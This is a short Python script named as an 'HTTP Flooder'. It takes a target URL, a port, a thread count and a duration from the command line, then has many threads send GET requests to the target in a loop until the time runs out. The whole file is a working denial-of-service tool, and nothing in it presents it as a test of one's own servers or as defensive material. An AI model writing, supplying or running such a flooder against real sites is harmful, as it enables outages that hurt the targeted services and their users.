import argparse
import requests
import threading
import time

# Function to send HTTP request
def send_request(target_url):
    try:
        response = requests.get(target_url)
        print(f"Sent request to {target_url}, Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending request to {target_url}: {e}")

# Function to simulate HTTP flood
def flood(base_url, port, num_requests, shutdown_time):
    start_time = time.time()
    target_url = f"{base_url}:{port}"  # Append the port to the URL

    def send_multiple_requests():
        while time.time() - start_time < shutdown_time:
            send_request(target_url)

    # Create multiple threads to simulate concurrent requests
    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=send_multiple_requests)
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

# Main function to parse arguments and execute the flooder
def main():
    parser = argparse.ArgumentParser(description="HTTP Flooder with IP and Port Support")
    parser.add_argument("url", help="Target URL or IP to flood (e.g., http://example.com or http://192.168.1.1)")
    parser.add_argument("-p", "--port", type=int, default=80, help="Port to target (default: 80 for HTTP, 443 for HTTPS)")
    parser.add_argument("-r", "--requests", type=int, default=10, help="Number of concurrent requests (default: 10)")
    parser.add_argument("-t", "--time", type=int, default=10, help="Time in seconds to run the flooder before shutdown (default: 10)")

    args = parser.parse_args()

    # Display info and start flooding
    print(f"Flooding {args.url} on port {args.port} for {args.time} seconds with {args.requests} concurrent requests...")
    flood(args.url, args.port, args.requests, args.time)
    print("Flooding completed or shutdown reached.")

if __name__ == "__main__":
    main()
